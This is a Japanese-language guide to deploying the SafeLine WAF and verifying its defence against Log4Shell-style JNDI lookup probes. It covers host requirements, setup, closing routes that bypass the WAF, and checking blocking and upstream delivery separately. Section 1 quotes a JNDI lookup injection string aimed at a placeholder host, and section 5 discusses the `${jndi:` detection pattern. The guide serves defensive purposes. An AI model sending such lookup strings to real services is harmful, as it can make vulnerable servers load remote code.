Log4Shell ふうのスキャンでは、URL、HTTP ヘッダー、リクエストボディなどに JNDI の lookup をうながすテキストがまぎれこみます。ねらいは、そのテキストをアプリのログにわたし、ぜいじゃくなロギングのしくみにひょうかさせることです。

SafeLine を HTTP/S のけんさレイヤーとしておくときは、「どこをとおったか」「なにがブロックされたか」「アプリまでなにがとどいたか」をわけてたしかめます。ブロックできたことだけでは、アプリのライブラリがあんぜんだとはいえません。

また、ここでよりどころにするドキュメントは、いっぱんてきな Web こうげきへのぼうぎょをせつめいしています。Log4Shell せんようルール、JNDI むけのせってい、なんどくかされた lookup へのほしょうはしめされていません。このガイドは、どうにゅうとけんしょうのチェックリストとしてつかってください。

## 1. まずログへのいりぐちをたなあらしする

こうかいホストごとに、Web アプリ、API、かんりインターフェース、ふるいサービスをならべます。ソースのいぞんファイルだけでなく、デプロイずみのアーティファクトやコンテナのなかもたしかめてください。

こうげきのテキストは、たとえば `${jndi:ldap://probe.invalid/check}` のようなかたちです。`probe.invalid` はせつめいようであり、テストサービスではありません。このテキストを、ログのふるまいがわからないほんばんサービスへおくらないでください。

チェックするのは、あやしい lookup をふくむリクエスト、よそうしない DNS やディレクトリサービスへのそとむきつうしん、みおぼえのないこプロセスです。リクエストにテキストがあれば、こころみがあったとわかります。じっこうされたかどうかは、つうしんやホストのきろくとつきあわせます。HTTP 200 やアプリのエラーだけでは、コードじっこうのしょうこになりません。

## 2. SafeLine をおくホストをたしかめる

SafeLine は、クライアントとアプリのあいだにリバースプロキシとしておく、セルフホストの WAF です。

どうにゅうまえに、Linux x86_64、Docker 20.10.14 いこう、Docker Compose 2.0.0 いこうをたしかめます。ドキュメントのさいしょうリソースは CPU 1 コア、メモリ 1 GB、ディスク 5 GB で、CPU の SSSE3 もようけんにふくまれます。

```sh
uname -m
docker version
docker compose version
free -h
df -h
lscpu | grep ssse3
```

さいしょうようけんをみたすことと、ほんばんのトラフィックをさばけることはべつです。ログのほぞんやうんようにひつようなよゆうもみこみます。どうにゅうじには、[こうしきドキュメント](https://docs.waf.chaitin.com/en/home) から、げんざいのインストールてじゅんとアーキテクチャのじょうけんをかくにんしてください。

## 3. インストールしてかんりアクセスをととのえる

こうしきのじどう、またはしゅどうてじゅんにしたがいます。じどうインストールには root けんげんがひつようです。しゅどうなら、かんきょうへんすう、シークレットのせいせい、パーミッションのてじゅんをしょうりゃくしないでください。

ダッシュボードのアドレスは `https://<ip>:9443` です。かんりしゃのにんしょうじょうほうをえるコマンドは、つぎのとおりです。

```sh
docker exec safeline-mgt resetadmin
```

かんりアクセスは、ひつようなオペレーターにしぼります。ほんばんのむきさきをかえるまえに、いまの DNS せっていと、もとにもどすてじゅんをきろくしておきます。

## 4. アプリをとうろくし、うかいルートをふさぐ

コンソールで **Applications** → **Add Application** をひらき、ドメイン、まちうけポート、アップストリームのアドレスをせっていします。HTTPS では SSL オプションをえらびます。そのあと、アプリのドメインが SafeLine サーバーの IP アドレスをさすように DNS をせっていします。

ふつうのリクエストがねらったアップストリームにとどくか、ログインや API などのひつようなフローがうごくかをたしかめます。さらに、ネットワークのせいぎょでオリジンへのちょくせつアクセスをせいげんしてください。

メインのドメインだけでなく、べつめいのホスト、ふるいまちうけポート、API のいりぐちもチェックします。DNS をひとつかえただけでは、すべてのリクエストが WAF をとおるとはかぎりません。

## 5. ブロックとアプリへのとうたつをべつべつにけんしょうする

まず、テストがきょかされたステージングで、ドキュメントにあるいっぱんてきなこうげきのサンプルをつかいます。こうげきリストと **detail** をひらき、SafeLine をとおったことと、ブロックのけっかをかくにんします。

つぎに、そとむきつうしんをせいぎょした、かくりかんきょうで JNDI のあつかいをけんしょうします。アプリがじっさいにログへかく URL、ヘッダー、ボディをたいしょうにしてください。いっぱんてきなこうげきをとめられても、すべての JNDI パターンをとめられるとはいえません。

けんしょうごとに、つぎをつきあわせます。

- リクエストのじこくとおくりさき
- WAF のけっか
- アップストリームのアクセスきろく
- DNS などのそとむきつうしん
- ホストのプロセスやファイルのへんか

`${jndi:` というもじれつだけをみるほうほうは、へんけいされたテキストをみのがしたり、せいとうなテキストにえいきょうしたりするおそれがあります。ここでさんしょうするドキュメントには、このもじれつむけの SafeLine カスタムルールてじゅんはしめされていません。

## 6. みじかいしっぱいれいから、はんていをそろえる

たとえば、ステージングのメインドメインではブロックをかくにんできたのに、ふるい API ホストへのリクエストがアップストリームにのこったとします。「WAF でたいさくずみ」とはんていすると、このいりぐちをみおとします。

このばあいは、API の DNS とまちうけさき、オリジンへのアクセスせいげんをみなおし、けんさルートをとおることをもういちどたしかめます。ブロックのきろくは、そのけんさポイントでとまったしょうこです。サービスぜんたいのあんぜんせいをしめすものではありません。

lookup とむすびつく、よそうしないそとむきつうしんがあれば、サービスといぞんライブラリをしらべます。あやしいプロセス、ファイルのへんか、にんしょうじょうほうのりようがあれば、インシデントたいおうのてじゅんにうつります。

ぜいじゃくないぞんライブラリはパッチまたはおきかえをおこない、アーティファクトをリビルドし、デプロイされたものまでかくにんしてください。WAF のけんしょうとならんで、そとむきつうしんのせいげんとかんしもつづけます。
